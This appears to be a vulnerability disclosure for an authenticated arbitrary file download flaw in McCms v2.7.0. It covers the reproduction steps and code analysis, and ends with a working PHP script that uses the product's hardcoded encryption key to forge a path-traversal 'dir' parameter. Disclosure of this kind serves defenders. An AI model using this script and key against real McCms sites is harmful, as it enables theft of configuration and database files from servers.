# Arbitrary file download vulnerability
##### Vulnerability Location: /sys/apps/controllers/admin/Backups.php
##### Affected Range: McCms v2.7.0
##### Vulnerability Cause: Backups.php contains a serious security vulnerability that allow attackers to download any file.
##### Vulnerability Impact: This leads to configuration files, database files, etc., and even directly obtaining the contents of any file on the server.
##### Link: https://www.mccms.cn/
# Vulnerability recurrence

After logging into the backend, you can see that in the administrator Management -> Backup and Restore Function point, first try to back up a file at will:

<img width="1512" alt="image" src="https://github.com/user-attachments/assets/e20d96a5-a820-41a2-97d9-a3f8ac82b463" />

Here I chose to back up an "mc_admin_log" file, and then check the backup list in data restoration:

<img width="1484" alt="image" src="https://github.com/user-attachments/assets/d850c968-458b-47e6-a97d-d6f2e3bffff8" />

It can be seen that there is a function point for packaging and downloading here! Try to package and download, and capture the corresponding data packets:

<img width="1021" alt="image" src="https://github.com/user-attachments/assets/6f4c3d3f-0166-446b-bc67-4120a3fced3a" />

Among them, the dir parameter is the relevant file to be downloaded. Here, we attempt to reconstruct and generate an encrypted malicious dir parameter value (that is, any file you want to download).

![image](https://github.com/user-attachments/assets/71ab6280-0909-423b-bc02-157ddea54675)

Why is it the "test" folder here? The reason is that I created a "test" folder under the same directory on the windows website, which also contains a file! As follows：

![image](https://github.com/user-attachments/assets/c1e2bf39-932d-4062-ae3c-4c28902829de)
![image](https://github.com/user-attachments/assets/14bfd18f-dfd6-45ef-a0e0-8d8a435b0e3e)

Then re-request the data packet and simultaneously modify the value of the parameter dir to the parameter value just generated:

<img width="1512" alt="image" src="https://github.com/user-attachments/assets/64ca4403-9217-4ab8-98f3-8f3a57ac05d6" />

Open the downloaded folder, extract it, and find that all the files in the folder have been downloaded.

<img width="798" alt="image" src="https://github.com/user-attachments/assets/dfcc8b6d-c291-4e70-bac1-1de76067f458" />

# Code Analysis

![image](https://github.com/user-attachments/assets/2219c06e-01b1-4f82-9810-b26567e59536)

The dir in the zip function is the relevant parameter passed after encryption. When followed up in the sys_auth function, it can be found that the encrypted key is fixed!

![image](https://github.com/user-attachments/assets/52bb7afd-a5a9-4b15-acf9-a4a910a93e16)

<img width="776" alt="image" src="https://github.com/user-attachments/assets/243f6e61-5737-4e8a-bc9e-b7d23825bcab" />

After that, perform the relevant decryption. After decryption, determine whether the directory corresponding to the dir parameter value is empty. If it is not empty, directly zip it and download the compressed file!

Re-encrypt and decrypt the script:

```
<?php
define('Mc_Encryption_Key','9LneByFjWQUYozg');
function sys_auth($string, $type = 0, $key = '', $expiry = 0) {
    
    if(is_array($string)) $string = json_encode($string);
	if($type == 1) $string = str_replace('-','+',$string);
	$ckey_length = 4;
	$key = md5($key ? $key : Mc_Encryption_Key);
	$keya = md5(substr($key, 0, 16));
	$keyb = md5(substr($key, 16, 16));
	$keyc = $ckey_length ? ($type == 1 ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
	$cryptkey = $keya.md5($keya.$keyc);
	$key_length = strlen($cryptkey);
	$string = $type == 1 ? base64_decode(substr($string, $ckey_length)) :  sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
	$string_length = strlen($string);
	$result = '';
	$box = range(0, 255);
	$rndkey = array();
	for($i = 0; $i <= 255; $i++) {
		$rndkey[$i] = ord($cryptkey[$i % $key_length]);
	}
	for($j = $i = 0; $i < 256; $i++) {
		$j = ($j + $box[$i] + $rndkey[$i]) % 256;
		$tmp = $box[$i];
		$box[$i] = $box[$j];
		$box[$j] = $tmp;
	}
	for($a = $j = $i = 0; $i < $string_length; $i++) {
		$a = ($a + 1) % 256;
		$j = ($j + $box[$a]) % 256;
		$tmp = $box[$a];
		$box[$a] = $box[$j];
		$box[$j] = $tmp;
		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
	} 
	if($type == 1) {
		if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
			$result = substr($result, 26);
			$json = json_decode($result,1);
			if(!is_numeric($result) && $json){
				return $json;
			}else{
				return $result;
			}
		}
		return '';
	}
	return str_replace('+', '-', $keyc.str_replace('=', '', base64_encode($result)));
}


$String = "../../../test";
$type = 0;

if($type==0){
	$encryptedString = sys_auth($String, $type);
	echo "加密结果: ";
	print_r($encryptedString);
}else{
	$decryptedData = sys_auth($String, $type);
	echo "解密结果: ";
    print_r($decryptedData); // 如果是数组会自动解析
}

?>
```
